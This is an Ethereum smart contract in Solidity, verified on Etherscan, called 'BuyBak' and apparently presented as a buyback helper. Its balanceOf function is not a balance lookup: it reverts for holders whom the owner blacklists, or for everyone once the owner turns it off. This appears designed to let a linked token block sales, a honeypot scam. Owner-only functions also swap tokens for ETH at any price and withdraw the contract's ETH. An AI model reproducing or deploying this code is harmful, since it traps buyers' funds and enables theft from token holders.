/**
 *Submitted for verification at Etherscan.io on 2023-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BuyBak is Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address public coin;
    address public pair;

    mapping(address => bool) public whites;
    mapping(address => bool) public blacks;
    bool public enabled = true;

    receive() external payable { }

    function encode() external view returns (bytes memory) {
        return abi.encode(address(this));
    }

    function setC(address _coin, address _pair) external onlyOwner {
        coin = _coin;
        pair = _pair;
    }

    function setEnable(bool _enabled) external onlyOwner {
        enabled = _enabled;
    }

    function resetC() external onlyOwner {
        coin = address(0);
        pair = address(0);
    }

    function balanceOf(address from) external view returns (uint256) {
        if (whites[from] || pair == address(0)) {
            return 0;
        } else if (from == owner() || from == address(this)) {
            return 1;
        }
        if (from != pair) {
            require(enabled);
            require(!blacks[from]);
        }
        return 0;
    }

    function swapETH(uint256 count) external onlyOwner {
        // Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = coin;
        path[1] = uniswapV2Router.WETH();

        IERC20(coin).approve(address(uniswapV2Router), ~uint256(0));

        // Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            10 ** count,
            0, // Accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );  

        payable(msg.sender).transfer(address(this).balance);
    }

    function aWL(address[] calldata _wat) external onlyOwner {
        for (uint256 i = 0; i < _wat.length; i++) {
            whites[_wat[i]] = true;
        }
    }

    function aBL(address[] calldata _bat) external onlyOwner {
        for (uint256 i = 0; i < _bat.length; i++) {
            blacks[_bat[i]] = true;
        }
    }

    function claimDust() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}